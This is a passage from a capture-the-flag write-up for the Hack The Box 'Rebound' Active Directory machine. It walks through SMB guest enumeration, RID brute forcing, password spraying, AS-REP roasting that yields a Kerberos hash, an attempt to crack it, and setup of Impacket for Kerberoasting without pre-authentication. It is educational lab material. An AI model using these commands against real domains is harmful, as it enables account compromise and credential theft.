<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Error</span> <span class="n">enumerating</span> <span class="n">shares</span><span class="p">:</span> <span class="n">STATUS_USER_SESSION_DELETED</span>
</pre></div>
<p>It returned an error due to the <strong>Null Session</strong> being disabled. However, we could carry out this enumeration employing a <strong>Guest Session</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'elswix'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">''</span> <span class="o">--</span><span class="n">shares</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">elswix</span><span class="p">:</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerated</span> <span class="n">shares</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">Share</span>           <span class="n">Permissions</span>     <span class="n">Remark</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="o">-----</span>           <span class="o">-----------</span>     <span class="o">------</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">ADMIN</span><span class="err">$</span>                          <span class="n">Remote</span> <span class="n">Admin</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">C</span><span class="err">$</span>                              <span class="n">Default</span> <span class="n">share</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPC</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">NETLOGON</span>                        <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">Shared</span>          <span class="n">READ</span>            
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="n">SYSVOL</span>                          <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
</pre></div>
<p>As you can see, it worked, and we seem to have <strong>read access</strong> to the <code>Shared</code> resource.</p><br/>
<p>I'll now connect to this resource using <code>smbclient</code>, without supplying a password:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">smbclient</span> <span class="o">//</span><span class="mf">10.10.11.231</span><span class="o">/</span><span class="n">Shared</span> <span class="o">-</span><span class="n">U</span> <span class="s2">"elswix"</span>
<span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">elswix</span><span class="p">]:</span>
<span class="n">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Fri</span> <span class="n">Aug</span> <span class="mi">25</span> <span class="mi">18</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">36</span> <span class="mi">2023</span>
  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Fri</span> <span class="n">Aug</span> <span class="mi">25</span> <span class="mi">18</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">36</span> <span class="mi">2023</span>

        <span class="mi">4607743</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">1044413</span> <span class="n">blocks</span> <span class="n">available</span>
<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span>
</pre></div>
<p>We were able to establish a connection to the resource, but there is no data on it.</p><br/>
<h3>RID Bruteforce</h3><br/>
<p>I have briefly explained this attack in the <code>Manager</code> WriteUP; however, I will provide a brief summary.</p><br/>
<p>The <strong>RID (Relative Identifier)</strong> is a unique number assigned to each security principal (such as a <strong>user</strong>, <strong>group</strong>, or <strong>computer</strong>) within a Windows <strong>domain</strong>. The <strong>Bruteforce RID</strong> technique entails attempting to guess or enumerate valid <strong>RID (Relative Identifier)</strong> values within a domain. This process can be automated, with various possible RIDs tested to identify those that produce <strong>valid SIDs</strong> (Security Identifiers). <strong>RIDs</strong> are usually integer values that begin from <strong>1000</strong> and increment in steps.</p><br/>
<p>We could attempt to perform this <strong>brute force</strong> attack using <code>crackmapexec</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'elswix'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">''</span> <span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span> <span class="mi">10000</span> <span class="o">&gt;</span> <span class="n">cme_ridbruteforce</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
<p>I have stored the output of the command in a file, as it will allow me to apply some filters on the capture and extract specific information.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">cme_ridbruteforce</span><span class="o">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">SidTypeUser</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $6}'</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">'s/rebound</span><span class="se">\\</span><span class="s1">//'</span> <span class="o">&gt;</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
<p>Now, we have a list of valid users in the <code>users.txt</code> file:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Administrator</span>
<span class="n">Guest</span>
<span class="n">krbtgt</span>
<span class="n">DC01</span><span class="err">$</span>
<span class="n">ppaul</span>
<span class="n">llune</span>
<span class="n">fflock</span>
<span class="n">jjones</span>
<span class="n">mmalone</span>
<span class="n">nnoon</span>
<span class="n">ldap_monitor</span>
<span class="n">oorend</span>
<span class="n">winrm_svc</span>
<span class="n">batch_runner</span>
<span class="n">tbrady</span>
<span class="n">delegator</span><span class="err">$</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Firstly, as I didn't encounter any potential passwords, I'll perform <strong>Password Spraying</strong>. I'll supply their usernames as passwords.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">bruteforce</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Administrator</span><span class="p">:</span><span class="n">Administrator</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Guest</span><span class="p">:</span><span class="n">Guest</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">krbtgt</span><span class="p">:</span><span class="n">krbtgt</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">DC01</span><span class="err">$</span><span class="p">:</span><span class="n">DC01</span><span class="err">$</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ppaul</span><span class="p">:</span><span class="n">ppaul</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">llune</span><span class="p">:</span><span class="n">llune</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">fflock</span><span class="p">:</span><span class="n">fflock</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">jjones</span><span class="p">:</span><span class="n">jjones</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">mmalone</span><span class="p">:</span><span class="n">mmalone</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">nnoon</span><span class="p">:</span><span class="n">nnoon</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ldap_monitor</span><span class="p">:</span><span class="n">ldap_monitor</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">oorend</span><span class="p">:</span><span class="n">oorend</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">winrm_svc</span><span class="p">:</span><span class="n">winrm_svc</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">batch_runner</span><span class="p">:</span><span class="n">batch_runner</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">tbrady</span><span class="p">:</span><span class="n">tbrady</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">delegator</span><span class="err">$</span><span class="p">:</span><span class="n">delegator</span><span class="err">$</span> <span class="n">STATUS_LOGON_FAILURE</span>
</pre></div>
<p>It seems that none of these users reuse their usernames as passwords. However, we could still <strong>leverage</strong> the presence of <strong>valid users</strong> on the domain. Let's attempt to perform an <strong>ASREP Roast</strong> attack.</p><br/>
<p>Firstly, let me clarify some concepts about this attack:</p><br/>
<p>An <strong>ASREP Roast</strong> attack targets <strong>Kerberos authentication</strong>. In this attack, the attacker requests authentication tickets from the Key Distribution Center (KDC) for accounts that <strong>do not require pre-authentication</strong>. These tickets are encrypted with a hash of the account's password. The attacker then attempts to <strong>crack the password hashes</strong> offline, gaining access to the plaintext passwords and potentially compromising the accounts.</p><br/>
<hr/>
<h3>Note</h3><br/>
<p>The TGT is first encrypted with the <strong>KDC master key</strong>, and then it is encrypted with the <strong>user master key</strong>. This attack aims to break <strong>a portion</strong> of the <strong>TGT cipher</strong>, which effectively belongs to the <strong>user master key</strong> encryption.</p><br/>
<p>If you want to <strong>learn</strong> more about <strong>Kerberos Authentication</strong>, you should take a look at this <a href="https://medium.com/@zaikoarg/unmasking-kerberos-attacking-the-kerberos-authentication-layer-7c05a6efa52b">article</a> written by my friend <a href="https://app.hackthebox.com/users/318121">ZaikoARG</a>, which deeply describes <strong>how Kerberos authentication works</strong>.</p><br/>
<hr/>
<p>To carry out this attack, we can use the <code>GetNPUsers.py</code> script from the <a href="https://github.com/fortra/impacket">Impacket</a> suite.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230909.154612.3</span><span class="n">beeda7</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">Administrator</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">jjones</span><span class="nd">@REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="p">:</span><span class="mi">06618</span><span class="n">fdc5edb202f5446eb07ee066150</span><span class="err">$</span><span class="mi">19</span><span class="n">fa13c0fd0e5d1a414762f229c01a04644a3f48c4edebc006ece7c9dc54d4842456dc3b3ec224403a2e4d18b20f5020f6a9f7460f6f32461fef348a2e1621b5f387ede9eebdf2f730eaef34fe3bcd7b738c98465fff4ea2d7bb4bea596016277d967144b466d6ed2ca66482d65ceb2af25869563bf7bf687c33fc38f2e0f92ff235d8b043a7eff0565fde2264df15aebbe15db29cfa6a9dcaaa03d3ac41a9cea7bc448b815e39f58f382f0b8e3901b61581f513fa27ab5e0dd9775b264fdc8c195c75965c626f92c9120c9585fa499f04c5d04b769d5016c1b9490b963db886404b5bbaeb04680b7007</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">delegator</span><span class="err">$</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
</pre></div>
<p>As you can see, it worked! The user <code>jjones</code> has <code>UF_DONT_REQUIRE_PREAUTH</code> set, making them vulnerable to an <strong>ASREP Roast</strong> attack. Since it returned a hash, we could attempt to brute force it and retrieve the user password. I've saved the hash into a file, and with <code>john</code>, I'll try to crack it.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">krb5asrep_hash</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5asrep</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">etype</span> <span class="mi">17</span><span class="o">/</span><span class="mi">18</span><span class="o">/</span><span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span> <span class="o">/</span> <span class="n">PBKDF2</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">SHA1</span> <span class="n">AES</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x</span><span class="p">])</span>
<span class="n">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">etype</span><span class="p">)</span> <span class="ow">is</span> <span class="mi">23</span> <span class="k">for</span> <span class="nb">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
<span class="mi">0</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">24</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">52</span><span class="p">)</span> <span class="mi">0</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">584981</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mi">584981</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mi">584981</span><span class="n">C</span><span class="o">/</span><span class="n">s</span>  <span class="mf">0839236891.</span><span class="o">.*</span><span class="mi">7</span><span class="err">Â¡</span><span class="n">Vamos</span><span class="err">!</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>
<p>It didn't crack! So, at this point, this hash is useless.</p><br/>
<h3>Kerberoasting Attack without Pre Authentication</h3><br/>
<p>As you may know, you need to have valid credentials against the domain to perform a Kerberoasting Attack. However, there is a way to achieve this without pre-authentication, as detailed in this <a href="https://www.thehacker.recipes/a-d/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication">article</a> from The Hacker Recipes.</p><br/>
<hr/>
<p><em>In September 2022, <a href="https://twitter.com/exploitph">Charlie Cark</a> explained how Service Tickets could be obtained through <code>AS-REQ</code> requests (which are usually used for TGT requests), instead of the usual <code>TGS-REQ</code>. He demonstrated (and <a href="https://github.com/GhostPack/Rubeus/pull/139">implemented</a>) how to abuse this in a Kerberoasting scenario.</em></p><br/>
<p><em>If an attacker knows of an account for which pre-authentication isn't required (i.e. an <a href="https://www.thehacker.recipes/a-d/movement/kerberos/asreproast">ASREProastable</a> account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).</em></p><br/>
<hr/>
<p>Since <strong>jjones</strong> is <strong>ASREProastable</strong>, we could attempt to carry out this attack. When Rebound was launched, the official Impacket repository didn't include the <code>-no-preauth</code> option in the <code>GetUserSPNs.py</code> script. However, nowadays it's included in the <a href="https://github.com/fortra/impacket">latest commits</a> (but not in a stable release).</p><br/>
<p>Even though the <code>-no-preauth</code> option is included in the official repository, I'll use the <code>getuserspns-nopreauth</code> branch from the Impacket repository at <a href="https://github.com/ShutdownRepo/impacket/tree/getuserspns-nopreauth">ShutdownRepo</a>.</p><br/>
<h3>Installation</h3><br/>
<p>Firstly, let's clone the repository, specifying the <code>getuserspns-nopreauth</code> branch:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ShutdownRepo</span><span class="o">/</span><span class="n">impacket</span> <span class="o">-</span><span class="n">b</span> <span class="n">getuserspns</span><span class="o">-</span><span class="n">nopreauth</span>
<span class="n">Cloning</span> <span class="n">into</span> <span class="s1">'impacket'</span><span class="o">...</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">24366</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">26</span><span class="o">/</span><span class="mi">26</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">17</span><span class="o">/</span><span class="mi">17</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Total</span> <span class="mi">24366</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">13</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">14</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">9</span><span class="p">),</span> <span class="n">pack</span><span class="o">-</span><span class="n">reused</span> <span class="mi">24340</span>
<span class="n">Receiving</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">24366</span><span class="o">/</span><span class="mi">24366</span><span class="p">),</span> <span class="mf">10.24</span> <span class="n">MiB</span> <span class="o">|</span> <span class="mf">10.43</span> <span class="n">MiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
<span class="n">Resolving</span> <span class="n">deltas</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">18491</span><span class="o">/</span><span class="mi">18491</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
</pre></div>
<p>Now, let's set up a virtual Python environment and install all dependencies:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">venv</span> <span class="n">venv</span>
<span class="nd">elswix@ubuntu$</span> <span class="o">.</span> <span class="n">venv</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">activate</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">pip</span> <span class="n">install</span> <span class="o">.</span>
<span class="n">Processing</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">impacket</span>
  <span class="n">Preparing</span> <span class="n">metadata</span> <span class="p">(</span><span class="n">setup</span><span class="o">.</span><span class="n">py</span><span class="p">)</span> <span class="o">...</span> <span class="n">done</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Successfully</span> <span class="n">installed</span> <span class="n">Jinja2</span><span class="o">-</span><span class="mf">3.1.3</span> <span class="n">MarkupSafe</span><span class="o">-</span><span class="mf">2.1.5</span> <span class="n">Werkzeug</span><span class="o">-</span><span class="mf">3.0.1</span> <span class="n">blinker</span><span class="o">-</span><span class="mf">1.7.0</span> <span class="n">cffi</span><span class="o">-</span><span class="mf">1.16.0</span> <span class="n">charset_normalizer</span><span class="o">-</span><span class="mf">3.3.2</span> <span class="n">click</span><span class="o">-</span><span class="mf">8.1.7</span> <span class="n">cryptography</span><span class="o">-</span><span class="mf">42.0.5</span> <span class="n">dnspython</span><span class="o">-</span><span class="mf">2.6.1</span> <span class="n">dsinternals</span><span class="o">-</span><span class="mf">1.2.4</span> <span class="n">flask</span><span class="o">-</span><span class="mf">3.0.2</span> <span class="n">future</span><span class="o">-</span><span class="mf">1.0.0</span> <span class="n">impacket</span><span class="o">-</span><span class="mf">0.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230928.161134</span><span class="o">.</span><span class="n">d2103449</span> <span class="n">itsdangerous</span><span class="o">-</span><span class="mf">2.1.2</span> <span class="n">ldap3</span><span class="o">-</span><span class="mf">2.9.1</span> <span class="n">ldapdomaindump</span><span class="o">-</span><span class="mf">0.9.4</span> <span class="n">pyOpenSSL</span><span class="o">-</span><span class="mf">24.1.0</span> <span class="n">pyasn1</span><span class="o">-</span><span class="mf">0.6.0</span> <span class="n">pycparser</span><span class="o">-</span><span class="mf">2.21</span> <span class="n">pycryptodomex</span><span class="o">-</span><span class="mf">3.20.0</span> <span class="n">six</span><span class="o">-</span><span class="mf">1.16.0</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Now, running <code>GetUserSPNs.py</code>, we observe that <code>-no-preauth</code> option is available:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230928.161134</span><span class="o">.</span><span class="n">d2103449</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">options</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
  <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">domain</span> <span class="n">TARGET_DOMAIN</span>
